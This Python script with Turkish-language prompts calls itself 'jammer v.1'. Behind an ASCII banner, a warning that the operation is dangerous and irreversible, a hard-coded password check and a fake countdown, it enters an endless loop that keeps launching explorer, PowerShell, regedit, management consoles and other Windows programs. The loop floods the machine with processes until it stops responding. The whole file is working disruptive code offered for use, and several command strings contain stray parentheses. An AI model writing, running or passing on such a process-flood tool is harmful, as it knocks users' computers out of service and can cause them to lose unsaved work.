import time 
import pyautogui
import sys
import subprocess
import colorama
from colorama import Back, Fore, Style

def text(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
print()
colorama.init()
print(Fore.LIGHTRED_EX)
colorama.init()
text("""

      _                                             _  
     | | __ _ _ __ ___  _ __ ___   ___ _ __  __   _/ | 
  _  | |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__| \ \ / / | 
 | |_| | (_| | | | | | | | | | | |  __/ |     \ V /| | 
  \___/ \__,_|_| |_| |_|_| |_| |_|\___|_|      \_(_)_| 



""")
colorama.init()
print(Fore.LIGHTGREEN_EX)
colorama.init()
text("jammer v.1'e hoşgeldiniz!")
print()
print()
print()
text("Lütfen Aşağıdaki Bilgileri Okuyunuz>>>")
print()
print()
print()
text("""

1- Bu İşlem Çok Tehlikelidir, ve geri alınamaz
        
2- İşlemden Önce Sizden Bir Şifre İsteyecektir
Şifreyi (JP.txt) dosyasından bulabilirsiniz.

NOT: Bu uygulamayı kullanırken tüm sorumluluğu
     üzerinize almış oluyorsunuz. :)      
""")

password = input("Şifre: ")
if password == "123456789uptjp":
    xyzx = "Dosyalar Yükleniyor "
    time.sleep(0.1)
    for i in range(50):
        print(xyzx + "  /", end="\r")
        time.sleep(0.1)
        print(xyzx + "  \\", end="\r")
        time.sleep(0.1)
    print()
    print()
    time.sleep(5)
    for i in range(10):
        print("İşlemi iptal etmek için son 10 saniye", end="\r")
        time.sleep(1)
        print(" " * len("İşlemi iptal etmek için son 10 saniye"), end="\r")
        time.sleep(1)
    print()
    print("İşlem Başlatılıyor....")
    text(">>>>>>>>>>>>>>>>>>>>>>>>>>>")
    while True:
        subprocess.Popen("start explorer.exe)", shell=True)
        subprocess.Popen("start powershell.exe", shell=True)
        subprocess.Popen("start calc.exe", shell=True)
        subprocess.Popen("start control.exe", shell=True)
        subprocess.Popen("start ms-settings", shell=True)
        subprocess.Popen("start regedit.exe", shell=True)
        subprocess.Popen("start services.msc", shell=True)
        subprocess.Popen("start taskschd.msc)", shell=True)
        subprocess.Popen("start eventvwr.msc", shell=True)
        subprocess.Popen("start diskmgmt.msc", shell=True)
        subprocess.Popen("start devmgmt.msc)", shell=True)
        subprocess.Popen("start msinfo32.exe", shell=True)
        subprocess.Popen("start taskschd.msc", shell=True)
        subprocess.Popen("start ms-settings", shell=True)
        subprocess.Popen("start msra.exe", shell=True)





